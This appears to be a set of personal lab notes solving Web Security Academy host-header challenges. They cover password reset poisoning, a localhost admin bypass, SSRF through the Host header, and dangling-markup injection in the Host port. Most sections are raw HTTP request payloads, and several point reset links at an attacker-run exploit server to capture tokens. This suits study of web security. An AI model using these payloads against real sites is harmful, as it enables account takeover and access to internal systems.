### Basic password reset poisoning

```
POST /forgot-password HTTP/1.1
Host: exploit-0af700b604e80d8ec16cb94001f500a7.exploit-server.net/exploit
```

### Host header authentication bypass

Admin interface only available to local users

```
GET /admin HTTP/1.1
Host: localhost
```

### Routing-based SSRF

```
GET /admin HTTP/1.1
Host: 192.168.0.§0§
Cookie: _lab=47%7cMC0CFC%2b46kgEe%2bmzEi8f%2bW%2fCfWv1tH3ZAhUAhVN1G1LfV0mbRmBkJW5af6ha3QjGrSConbKCocZaq4tX4FzgGO%2bITd3GLa1Ai3IO%2b5qx65rId3Ypj3412fGPmpfELkkasP8xOuDJNHYegCEwBblL2IvYf%2fHVUa8PFuTkYY%2bTdMn0UBMT; session=Esb1JmRA37qVAuxdxbEmxJbvQ9SXA5JO
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e00e804fa64edc0ba97ff00390002.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

<img width="947" alt="image" src="https://user-images.githubusercontent.com/56427824/195255259-fe32f0f1-0294-4400-80b3-72e5aa45fd06.png">

### SSRF via flawed request parsing

```
GET https://0a120016040de15ac048158900c10055.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.§0§
Cookie: _lab=46%7cMCwCFDkppp%2bS7RgnTeg%2bQyqH3hcVM4ZiAhQxyrOv6ExHmS5HdCZidC3EbgkslqyXiAZ9xfB0M6LrCBvIwdEtp0VrN2QM06BRkNqE4hoD%2fLqYtyfj3CGNAD0HjgOg0BvFnm7zCDPninlduOmYMF1kosV9LuekJppeLpksioE8997OWUE%3d; session=hUrxxiLiHUMfxrmLAysscxWfLWZdFyVX
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

<img width="944" alt="image" src="https://user-images.githubusercontent.com/56427824/195256730-10fbcc25-0eb5-4e51-8735-5dbf8cc0ac87.png">

###

Realise that you cannot really change the host header hostname... but what about the port?

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:801
```

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:asd
```

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:<a>click me</a>

href="https://0a51001f0325f795c05685a400c900f4.web-security-academy.net:<a>click me</a>/login" <- how it looks like in email client
```

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:"><a>click me</a>

href="https://0a51001f0325f795c05685a400c900f4.web-security-academy.net:"><a>click me</a>/login" <- how it looks like in email client, not working, fuzz it with special characters 
```

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:<>/'\#"><a>click me</a> <- works!
```

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:<>/'\#"><a href=https://exploit-0afc008c03c1f7d2c094853501de007f.exploit-server.net/log >click me</a> <- works!
```

ANSWER: 

AV in email scanner triggers the request? ihni, guessing

```
POST /forgot-password HTTP/1.1
Host: 0a51001f0325f795c05685a400c900f4.web-security-academy.net:'<a href="https://exploit-0afc008c03c1f7d2c094853501de007f.exploit-server.net/?
```


